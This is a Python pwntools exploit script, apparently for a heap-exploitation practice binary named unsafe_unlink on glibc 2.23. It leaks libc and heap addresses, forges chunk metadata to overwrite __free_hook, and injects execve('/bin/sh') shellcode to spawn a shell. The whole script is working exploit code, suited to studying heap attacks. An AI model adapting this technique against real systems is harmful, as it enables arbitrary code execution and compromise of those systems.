#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./unsafe_unlink")
p = process("./unsafe_unlink")
libc = ELF("../.glibc/glibc_2.23_unsafe-unlink/libc.so.6")
gdb.attach(p,"init-pwndbg")

def initiate():
    p.recvuntil("puts() @ ")
    leak1 =  p.recvline()[:-1]
    p.recvuntil("heap @ ")
    leak2 = p.recvline()[:-1]
    leak1 = int(leak1,16)
    leak2 = int(leak2,16)
    return leak1, leak2

def malloc(smallchunk_size):
    p.sendlineafter("> ","1")
    p.sendafter("size: ",str(smallchunk_size))

def free(index):
    p.sendlineafter("> ","3")
    p.sendlineafter("index: ",str(index))

def edit(index,data):
    p.sendlineafter("> ","2")
    p.sendlineafter("index: ",str(index))
    p.sendafter("data: ",data)


leak1,leak2 = initiate()
libc.address = leak1 - libc.sym.puts
heap_address = leak2
log.critical(f"heap base: {hex(heap_address)}")
log.critical("Libc base: {}".format(hex(libc.address)))

malloc(0x98)
malloc(0x98)
one_gadget = libc.address + 0xd6311
shellcode = asm(shellcraft.sh())
# edit(0,p64(libc.sym.__free_hook - 0x18)+p64(heap_address+0x40)+ b'a'*16+shellcode +b'a'*(0x70-len(shellcode))+p64(0xa0)+p64(0xa0))
fd = libc.sym.__free_hook
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))
shellcode_start = heap_address + 32
payload = p64(fd-24)+p64(shellcode_start)+shellcode+b'a'*(0x80-len(shellcode))+p64(0xa0)+p64(0xa0)
edit(0,payload)
free(1)
free(1)
free(0)
# p.recvuntil(b"@ ")
# libc_leak= p.recvline()[:-1]
# p.recvuntil(b"@ ")
# heap_leak= p.recvline()[:-1]
# libc_leak = libc_leak.ljust(8,b'\x00')
# heap_leak = heap_leak.ljust(8,b'\x00')
# libc_leak = u64(libc_leak)
# heap_leak = u64(heap_leak)
# log.critical(hex(libc_leak))
# log.critical(hex(heap_leak))
p.interactive()


